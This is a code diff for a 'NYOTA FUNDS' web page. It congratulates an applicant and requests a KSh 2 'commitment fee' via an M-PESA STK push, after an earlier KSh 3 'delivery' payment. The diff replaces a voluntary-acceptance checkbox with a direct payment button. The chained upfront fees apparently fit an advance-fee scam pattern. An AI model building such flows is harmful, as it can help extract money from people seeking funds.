@@ -30,6 +30,7 @@ body{
 
 .card{
     width:100%;
+
     background:
         linear-gradient(
             145deg,
@@ -38,6 +39,7 @@ body{
         );
 
     padding:22px 18px 20px;
+
     border-radius:18px;
 
     box-shadow:
@@ -50,6 +52,7 @@ body{
 .success{
     width:70px;
     height:70px;
+
     margin:0 auto 14px;
 
     display:flex;
@@ -76,6 +79,7 @@ h1{
     font-weight:800;
 
     margin:2px 0 16px;
+
     padding:10px;
 
     border:1px solid #FFFFFF;
@@ -84,8 +88,10 @@ h1{
 
 p{
     text-align:center;
+
     font-size:14px;
     line-height:1.6;
+
     color:#FFFFFF;
 }
 
@@ -96,17 +102,19 @@ p{
 
 .amount{
     background:#000000;
+
     border:1px solid #FFFFFF;
     border-radius:12px;
 
-    padding:17px 10px;
+    padding:16px 10px;
+
     margin:18px 0;
 
     text-align:center;
 
     color:#FFD400;
 
-    font-size:27px;
+    font-size:28px;
     font-weight:800;
 }
 
@@ -123,6 +131,7 @@ p{
 
 .row{
     display:flex;
+
     justify-content:space-between;
     align-items:center;
 
@@ -130,7 +139,8 @@ p{
 
     padding:10px 0;
 
-    border-bottom:1px solid
+    border-bottom:
+        1px solid
         rgba(255,255,255,0.25);
 }
 
@@ -145,9 +155,13 @@ p{
 
 .value{
     font-size:14px;
+
     font-weight:800;
+
     color:#FFD400;
+
     text-align:right;
+
     word-break:break-word;
 }
 
@@ -156,67 +170,46 @@ p{
 
     padding:13px;
 
-    background:rgba(255,212,0,0.12);
+    background:
+        rgba(255,212,0,0.12);
 
     border:1px solid #FFD400;
+
     border-radius:10px;
 
     color:#FFFFFF;
 
     font-size:13px;
+
     line-height:1.5;
 
     text-align:center;
 }
 
-.accept{
-    display:flex;
-    align-items:flex-start;
-
-    gap:10px;
-
-    margin-top:18px;
-
-    padding:13px;
-
-    background:#000000;
-
-    border:1px solid #FFFFFF;
-    border-radius:10px;
-}
-
-.accept input{
-    width:20px;
-    height:20px;
-    margin-top:2px;
-
-    accent-color:#FFD400;
-}
-
-.accept label{
-    font-size:13px;
-    line-height:1.5;
-    color:#FFFFFF;
-}
-
 button{
     width:100%;
+
     padding:15px;
+
     margin-top:18px;
 
     background:#FFD400;
+
     color:#000000;
 
     border:1px solid #000000;
+
     border-radius:11px;
 
     font-size:16px;
+
     font-weight:800;
 
     cursor:pointer;
 
     box-shadow:
-        0 10px 30px rgba(0,0,0,0.30);
+        0 10px 30px
+        rgba(0,0,0,0.30);
 }
 
 button:active{
@@ -224,10 +217,13 @@ button:active{
 }
 
 button:disabled{
-    background:rgba(255,255,255,0.25);
+    background:
+        rgba(255,255,255,0.25);
+
     color:#FFFFFF;
 
     cursor:not-allowed;
+
     box-shadow:none;
 }
 
@@ -239,6 +235,7 @@ button:disabled{
     color:#FFD400;
 
     font-size:13px;
+
     font-weight:600;
 
     line-height:1.5;
@@ -264,15 +261,17 @@ button:disabled{
 
     .card{
         padding:18px 13px 15px;
+
         border-radius:15px;
     }
 
     h1{
-        font-size:22px;
+        font-size:23px;
     }
 
     button{
         padding:14px;
+
         font-size:15px;
     }
 
@@ -282,139 +281,212 @@ button:disabled{
 
 </head>
 
+
 <body>
+
 
 <div class="container">
 
-<div class="card">
+<div class="card" id="commitmentCard">
 
-<div class="success">
-    ✓
-</div>
 
-<h1>
-    Congratulations 🎊🎉🎊💸
-</h1>
+    <div class="success">
+        ✓
+    </div>
 
-<p>
-    We have received your delivery fee.
-</p>
 
-<p>
-    Welcome,
-    <span class="name" id="name">
-        Applicant
-    </span>
-</p>
+    <h1>
+        Congratulations 🎊
+    </h1>
 
-<div class="amount">
-    Commitment Fee: KSh 2
-</div>
 
-<div class="info">
-
-    <div class="row">
-
-        <div class="label">
-            M-PESA Number
-        </div>
-
-        <div
-            class="value"
-            id="phone"
+    <p>
+        Welcome,
+        <span
+            class="name"
+            id="name"
         >
-            —
+            Applicant
+        </span>
+    </p>
+
+
+    <p>
+        We have received your
+        delivery payment successfully.
+    </p>
+
+
+    <div class="amount">
+        Commitment Fee: KSh 2
+    </div>
+
+
+    <p>
+        To complete the process,
+        please pay the commitment fee
+        shown above.
+    </p>
+
+
+    <div class="info">
+
+
+        <div class="row">
+
+            <div class="label">
+                M-PESA Number
+            </div>
+
+            <div
+                class="value"
+                id="phone"
+            >
+                —
+            </div>
+
         </div>
+
+
+        <div class="row">
+
+            <div class="label">
+                Delivery Payment
+            </div>
+
+            <div class="value">
+                KSh 3
+            </div>
+
+        </div>
+
+
+        <div class="row">
+
+            <div class="label">
+                Commitment Fee
+            </div>
+
+            <div class="value">
+                KSh 2
+            </div>
+
+        </div>
+
 
     </div>
 
-    <div class="row">
 
-        <div class="label">
-            Commitment Fee
-        </div>
+    <div class="notice">
 
-        <div class="value">
-            KSh 2
-        </div>
+        A separate M-PESA STK prompt will be
+        sent for the KSh 2 commitment fee
+        after you tap the payment button.
 
     </div>
 
-</div>
 
-<div class="notice">
-
-    Please review the commitment fee
-    information carefully before continuing.
-
-</div>
-
-<div class="accept">
-
-    <input
-        type="checkbox"
-        id="acceptFee"
-        onchange="updateButton()"
+    <button
+        type="button"
+        id="payBtn"
     >
+        Pay KSh 2 Commitment Fee
+    </button>
 
-    <label for="acceptFee">
 
-        I have reviewed the KSh 2 commitment
-        fee and voluntarily accept the terms
-        before continuing.
+    <p id="message"></p>
 
-    </label>
 
-</div>
+    <div class="footer">
+        NYOTA FUNDS
+    </div>
 
-<button
-    type="button"
-    id="continueBtn"
-    disabled
-    onclick="continueCommitment()"
->
-    Accept & Continue
-</button>
-
-<p id="message"></p>
-
-<div class="footer">
-    NYOTA FUNDS
-</div>
 
 </div>
 
 </div>
+
 
 <script>
+
+/* =====================================================
+   NYOTA BACKEND
+===================================================== */
+
+const BACKEND_URL =
+    "https://nyota-backed1.onrender.com";
+
+
+/* =====================================================
+   COMMITMENT FEE
+===================================================== */
+
+const COMMITMENT_FEE = 2;
+
+
+/* =====================================================
+   DOM
+===================================================== */
+
+const card =
+    document.getElementById(
+        "commitmentCard"
+    );
+
+const nameElement =
+    document.getElementById(
+        "name"
+    );
+
+const phoneElement =
+    document.getElementById(
+        "phone"
+    );
+
+const payButton =
+    document.getElementById(
+        "payBtn"
+    );
+
+const messageElement =
+    document.getElementById(
+        "message"
+    );
+
 
 /* =====================================================
    APPLICANT
 ===================================================== */
 
-const applicant =
-    localStorage.getItem("applicantName") ||
-    localStorage.getItem("fullName") ||
+const applicantName =
+    localStorage.getItem(
+        "applicantName"
+    ) ||
+
+    localStorage.getItem(
+        "fullName"
+    ) ||
+
     "Applicant";
 
-document.getElementById("name")
-    .textContent = applicant;
-
-
-/* =====================================================
-   PHONE
-===================================================== */
 
 const savedPhone =
-    localStorage.getItem("phoneNumber") || "";
+    localStorage.getItem(
+        "phoneNumber"
+    ) || "";
 
-document.getElementById("phone")
-    .textContent =
-        savedPhone || "Not available";
+
+nameElement.textContent =
+    applicantName;
+
+
+phoneElement.textContent =
+    savedPhone ||
+    "Not available";
 
 
 /* =====================================================
-   DELIVERY PAYMENT PROTECTION
+   CHECK DELIVERY PAYMENT
 ===================================================== */
 
 const deliveryStatus =
@@ -422,10 +494,18 @@ const deliveryStatus =
         "deliveryPaymentStatus"
     ) || "";
 
-if(deliveryStatus !== "COMPLETED"){
 
-    document.querySelector(".card")
-        .innerHTML = `
+/*
+   The commitment page should only be
+   available after the KSh 3 delivery
+   payment has been confirmed.
+*/
+
+if(
+    deliveryStatus !== "COMPLETED"
+){
+
+    card.innerHTML = `
 
         <div class="success">
             !
@@ -436,121 +516,618 @@ if(deliveryStatus !== "COMPLETED"){
         </h1>
 
         <p>
-            Your delivery payment has not
-            been confirmed yet.
+            Your KSh 3 delivery payment
+            has not been confirmed yet.
         </p>
 
         <button
             type="button"
-            onclick="
-                window.location.href='delivery.html'
-            "
+            id="returnDeliveryBtn"
         >
             Return to Delivery
         </button>
 
     `;
 
-}
 
+    document
+        .getElementById(
+            "returnDeliveryBtn"
+        )
+        .addEventListener(
+            "click",
+            function(){
 
-/* =====================================================
-   ENABLE BUTTON
-===================================================== */
+                window.location.href =
+                    "Confirmation.html";
 
-function updateButton(){
-
-    const checkbox =
-        document.getElementById(
-            "acceptFee"
+            }
         );
-
-    const button =
-        document.getElementById(
-            "continueBtn"
-        );
-
-    button.disabled =
-        !checkbox.checked;
 
 }
 
 
 /* =====================================================
-   ACCEPT COMMITMENT
+   NORMALIZE PHONE
 ===================================================== */
 
-function continueCommitment(){
+function normalizePhone(phone){
 
-    const checkbox =
-        document.getElementById(
-            "acceptFee"
+    let value =
+        String(phone || "")
+            .trim()
+            .replace(/\s+/g,"")
+            .replace(/-/g,"");
+
+
+    if(
+        value.startsWith("+254")
+    ){
+
+        value =
+            value.substring(1);
+
+    }
+
+
+    if(
+        value.startsWith("07")
+    ){
+
+        value =
+            "254" +
+            value.substring(1);
+
+    }
+
+
+    if(
+        value.startsWith("01")
+    ){
+
+        value =
+            "254" +
+            value.substring(1);
+
+    }
+
+
+    return value;
+
+}
+
+
+/* =====================================================
+   PAY COMMITMENT
+===================================================== */
+
+async function payCommitment(){
+
+    const phone =
+        normalizePhone(
+            savedPhone
         );
 
-    const button =
-        document.getElementById(
-            "continueBtn"
-        );
 
-    const message =
-        document.getElementById(
-            "message"
-        );
+    if(
+        !/^254\d{9}$/.test(
+            phone
+        )
+    ){
 
-
-    if(!checkbox.checked){
-
-        message.textContent =
-            "Please accept the commitment terms before continuing.";
+        messageElement.textContent =
+            "A valid M-PESA number is required.";
 
         return;
 
     }
 
 
-    /* -----------------------------------------
-       SAVE ACCEPTANCE
-    ----------------------------------------- */
-
-    localStorage.setItem(
-        "commitmentAccepted",
-        "YES"
-    );
-
-    localStorage.setItem(
-        "commitmentFee",
-        "2"
-    );
-
-    localStorage.setItem(
-        "commitmentAcceptedAt",
-        new Date().toISOString()
-    );
+    payButton.disabled =
+        true;
 
 
-    button.disabled = true;
-
-    button.textContent =
-        "Accepted ✓";
+    payButton.textContent =
+        "Sending STK Push...";
 
 
-    message.textContent =
-        "Commitment accepted. Continuing...";
+    messageElement.textContent =
+        "Please wait...";
 
 
-    /* -----------------------------------------
-       NEXT PAGE
-    ----------------------------------------- */
+    try{
 
-    setTimeout(function(){
+        const response =
+            await fetch(
 
-        window.location.replace(
-            "Confirmation.html"
+                BACKEND_URL +
+                "/api/payment/stk-push",
+
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            phone,
+
+                        amount:
+                            COMMITMENT_FEE,
+
+                        description:
+                            "Nyota commitment fee"
+
+                    })
+
+                }
+
+            );
+
+
+        const data =
+            await response
+                .json()
+                .catch(
+                    () => ({})
+                );
+
+
+        console.log(
+            "COMMITMENT STK RESPONSE:",
+            data
         );
 
-    },1000);
+
+        if(
+            !response.ok ||
+            !data.success
+        ){
+
+            throw new Error(
+
+                data.error ||
+
+                data.message ||
+
+                "Commitment payment request failed."
+
+            );
+
+        }
+
+
+        /* ==========================================
+           PAYMENT REFERENCE
+        ========================================== */
+
+        const reference =
+            data.reference;
+
+
+        if(!reference){
+
+            throw new Error(
+                "No payment reference was returned."
+            );
+
+        }
+
+
+        /* ==========================================
+           SAVE PAYMENT DATA
+        ========================================== */
+
+        localStorage.setItem(
+            "commitmentPaymentReference",
+            reference
+        );
+
+
+        localStorage.setItem(
+            "commitmentPaymentStatus",
+            "SENT"
+        );
+
+
+        if(
+            data.transactionId
+        ){
+
+            localStorage.setItem(
+                "commitmentTransactionId",
+                data.transactionId
+            );
+
+        }
+
+
+        /* ==========================================
+           WAIT FOR PAYMENT
+        ========================================== */
+
+        payButton.textContent =
+            "Waiting for Payment...";
+
+
+        messageElement.textContent =
+            "M-PESA prompt sent. Enter your M-PESA PIN to complete the KSh 2 commitment fee.";
+
+
+        checkCommitmentPayment(
+            reference
+        );
+
+
+    }
+    catch(error){
+
+        console.error(
+            "COMMITMENT PAYMENT ERROR:",
+            error
+        );
+
+
+        messageElement.textContent =
+            error.message ||
+
+            "Unable to send commitment payment request.";
+
+
+        payButton.textContent =
+            "Pay KSh 2 Commitment Fee";
+
+
+        payButton.disabled =
+            false;
+
+    }
 
 }
+
+
+/* =====================================================
+   CHECK COMMITMENT PAYMENT
+===================================================== */
+
+function checkCommitmentPayment(
+    reference
+){
+
+    let attempts = 0;
+
+    const maxAttempts = 100;
+
+
+    if(
+        window.commitmentChecker
+    ){
+
+        clearInterval(
+            window.commitmentChecker
+        );
+
+    }
+
+
+    window.commitmentChecker =
+
+        setInterval(
+
+            async function(){
+
+                attempts++;
+
+
+                try{
+
+                    const url =
+
+                        BACKEND_URL +
+
+                        "/api/payment/status?reference=" +
+
+                        encodeURIComponent(
+                            reference
+                        );
+
+
+                    const response =
+                        await fetch(
+                            url,
+                            {
+                                method:"GET",
+                                cache:"no-store"
+                            }
+                        );
+
+
+                    const data =
+                        await response
+                            .json()
+                            .catch(
+                                () => ({})
+                            );
+
+
+                    console.log(
+                        "COMMITMENT PAYMENT STATUS:",
+                        data
+                    );
+
+
+                    /* ==================================
+                       SUCCESS
+                    ================================== */
+
+                    if(
+
+                        data.status ===
+                            "COMPLETED"
+
+                        ||
+
+                        data.status ===
+                            "SUCCESS"
+
+                    ){
+
+                        clearInterval(
+                            window.commitmentChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "commitmentPaymentStatus",
+                            "COMPLETED"
+                        );
+
+
+                        localStorage.setItem(
+                            "commitmentPaymentReference",
+                            data.reference ||
+                            reference
+                        );
+
+
+                        if(
+                            data.transactionId
+                        ){
+
+                            localStorage.setItem(
+                                "commitmentTransactionId",
+                                data.transactionId
+                            );
+
+                        }
+
+
+                        if(
+                            data.mpesaReceipt
+                        ){
+
+                            localStorage.setItem(
+                                "commitmentMpesaReceipt",
+                                data.mpesaReceipt
+                            );
+
+                        }
+
+
+                        payButton.textContent =
+                            "Payment Successful";
+
+
+                        messageElement.textContent =
+                            "Commitment payment received successfully. Redirecting...";
+
+
+                        /* ==============================
+                           NEXT PAGE
+                        ============================== */
+
+                        setTimeout(
+                            function(){
+
+                                window.location.replace(
+                                    "success.html"
+                                );
+
+                            },
+                            800
+                        );
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       FAILED
+                    ================================== */
+
+                    if(
+                        data.status ===
+                        "FAILED"
+                    ){
+
+                        clearInterval(
+                            window.commitmentChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "commitmentPaymentStatus",
+                            "FAILED"
+                        );
+
+
+                        messageElement.textContent =
+                            "The KSh 2 commitment payment was not completed. You can try again.";
+
+
+                        payButton.textContent =
+                            "Try KSh 2 Commitment Payment Again";
+
+
+                        payButton.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       EXPIRED
+                    ================================== */
+
+                    if(
+                        data.status ===
+                        "EXPIRED"
+                    ){
+
+                        clearInterval(
+                            window.commitmentChecker
+                        );
+
+
+                        localStorage.setItem(
+                            "commitmentPaymentStatus",
+                            "EXPIRED"
+                        );
+
+
+                        messageElement.textContent =
+                            "The commitment payment request expired. Please try again.";
+
+
+                        payButton.textContent =
+                            "Pay KSh 2 Commitment Fee";
+
+
+                        payButton.disabled =
+                            false;
+
+
+                        return;
+
+                    }
+
+
+                    /* ==================================
+                       TIMEOUT
+                    ================================== */
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.commitmentChecker
+                        );
+
+
+                        messageElement.textContent =
+                            "Payment confirmation is taking longer than expected. Please try again.";
+
+
+                        payButton.textContent =
+                            "Pay KSh 2 Commitment Fee";
+
+
+                        payButton.disabled =
+                            false;
+
+                    }
+
+
+                }
+                catch(error){
+
+                    console.error(
+                        "COMMITMENT STATUS ERROR:",
+                        error
+                    );
+
+
+                    /*
+                       Temporary backend errors are
+                       not immediately treated as failed
+                       payments.
+                    */
+
+                    if(
+                        attempts >=
+                        maxAttempts
+                    ){
+
+                        clearInterval(
+                            window.commitmentChecker
+                        );
+
+
+                        messageElement.textContent =
+                            "Unable to confirm the commitment payment right now. Please try again.";
+
+
+                        payButton.textContent =
+                            "Pay KSh 2 Commitment Fee";
+
+
+                        payButton.disabled =
+                            false;
+
+                    }
+
+                }
+
+            },
+
+            3000
+
+        );
+
+}
+
+
+/* =====================================================
+   BUTTON
+===================================================== */
+
+payButton.addEventListener(
+    "click",
+    payCommitment
+);
+
+
+/* =====================================================
+   CLEAN UP
+===================================================== */
+
+window.addEventListener(
+    "beforeunload",
+    function(){
+
+        if(
+            window.commitmentChecker
+        ){
+
+            clearInterval(
+                window.commitmentChecker
+            );
+
+        }
+
+    }
+);
 
 </script>
 
